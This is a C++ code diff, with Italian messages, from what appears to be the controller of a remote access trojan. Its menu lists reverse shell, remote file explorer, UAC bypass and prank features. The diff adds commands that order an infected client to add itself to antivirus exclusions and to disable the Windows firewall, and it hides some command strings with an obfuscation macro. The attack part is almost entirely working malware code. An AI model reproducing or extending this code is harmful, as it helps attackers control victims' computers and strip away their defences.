@@ -582,7 +582,7 @@ bool ReverseShell(SOCKET Sock)
             }
             else if (ToLowerCase(Cmd) == "powershell")
             {
-                cout << "Non puoi eseguire usa sessione PS ma puoi lanciare singoli comandi preceduti da \"PowerShell\".\n" << endl;
+                cout << "Non puoi eseguire una sessione PS ma puoi lanciare singoli comandi preceduti da \"PowerShell\".\n" << endl;
             }
             else
             {
@@ -1262,6 +1262,38 @@ bool VibeMouse(SOCKET Sock, int ID)
     return true;
 }
 
+bool AddAVexclusion(SOCKET Sock, int ID)
+{
+    string Status;
+
+    Status = COMUNICAZIONI::PingPong(Sock, "addexclusion");
+
+    if (Status == "ok")
+        cout << "Client aggiunto alle esclusioni dell'AV." << endl;
+    else if (Status == "ko")
+        cout << "Errore durante l'aggiunta del Client alle esclusioni." << endl;
+    else
+        return false;
+
+    return true;
+}
+
+bool DisableFirewall(SOCKET Sock, int ID)
+{
+    string Status;
+
+    Status = COMUNICAZIONI::PingPong(Sock, "disablefw");
+
+    if (Status == "ok")
+        cout << "Firewall disabilitato." << endl;
+    else if (Status == "ko")
+        cout << "Errore durante l'operazione." << endl;
+    else
+        return false;
+
+    return true;
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
     CLInterface cli;
@@ -1280,6 +1312,7 @@ void Sessione(int ID, SOCKET Sock)
         cmd = ToLowerCase(cmd);
 
         Clients[ID].InTask = true;
+        Sleep(100);
 
         if (cmd == "help")
         {
@@ -1299,6 +1332,8 @@ void Sessione(int ID, SOCKET Sock)
 			StampaHelp((string)AY_OBFUSCATE("Revshell\t"), "- Lancia comandi sulla shell del PC remoto.");
             StampaHelp("Explorer\t", "- Gestisci i file del PC remoto.");
 			StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
+            StampaHelp("AddAVexclusion\t", "- Aggiunge il Client alle esclusioni dell'AV (solo se Admin).");
+            StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall."));
             cout << endl;
 
             cli.SubTitle("Fun", 30, tc.Yellow);
@@ -1447,6 +1482,36 @@ void Sessione(int ID, SOCKET Sock)
             {
                 if (!VibeMouse(Sock, ID))
                     Controllo = CheckConnection(Sock, ID);
+            }
+        }
+        else if (cmd == "addavexclusion")
+        {
+            if (Clients[ID].info.CompatibleVer < 4)
+                StampaIncompatibile();
+            else
+            {
+                if (Clients[ID].info.UAC == "Admin")
+                {
+                    if (!AddAVexclusion(Sock, ID))
+                        Controllo = CheckConnection(Sock, ID);
+                }
+                else
+                    cout << "Il Client non dispone di privilegi necessari per eseguire l'operazione." << endl;
+            }
+        }
+        else if (cmd == (string)AY_OBFUSCATE("disablefirewall"))
+        {
+            if (Clients[ID].info.CompatibleVer < 4)
+                StampaIncompatibile();
+            else
+            {
+                if (Clients[ID].info.UAC == "Admin")
+                {
+                    if (!DisableFirewall(Sock, ID))
+                        Controllo = CheckConnection(Sock, ID);
+                }
+                else
+                    cout << "Il Client non dispone di privilegi necessari per eseguire l'operazione." << endl;
             }
         }
         else
